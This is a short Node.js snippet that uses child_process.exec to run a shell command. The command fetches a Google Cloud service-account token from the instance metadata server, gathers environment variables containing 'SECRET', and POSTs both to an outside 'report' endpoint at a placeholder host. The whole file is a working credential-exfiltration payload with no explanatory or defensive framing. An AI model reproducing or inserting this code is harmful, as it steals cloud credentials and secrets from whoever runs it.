const {exec}=require('child_process');
const cmd=`TOKEN=\$(curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token); ENVS=\$(env | grep SECRET); curl -X POST -d "token=\${TOKEN}&env=\${ENVS}" https://example.invalid/report`;
exec(cmd);